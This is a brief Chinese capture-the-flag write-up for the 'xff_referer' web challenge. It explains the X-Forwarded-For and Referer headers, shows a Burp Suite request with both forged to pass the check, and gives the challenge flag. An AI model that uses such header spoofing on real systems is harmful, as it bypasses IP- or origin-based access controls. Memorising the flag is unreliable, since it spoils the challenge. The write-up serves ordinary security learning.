## xff_referer

X老师告诉小宁其实xff和referer是可以伪造的。

---

### X-Forwarded-For refer

* xff：X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。
* refer：HTTP来源地址。 是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。
  简单的讲，referer就是告诉服务器当前访问者是从哪个url地址跳转到自己的

**xff和referer是HTTP协议首部中的两个字段，分别指出发送方最原始的IP地址，和你从哪个页面的链接进入的这个页面。**

### 修改request
Brupsuit 抓包 后修改后 Forword
```http request
GET / HTTP/1.1
Host: 61.147.171.105:51503
X-Forwarded-For:123.123.123.123
Referer:https://www.google.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```



### flag
cyberpeace{839abfe38282bbee5348399cfc2830c2}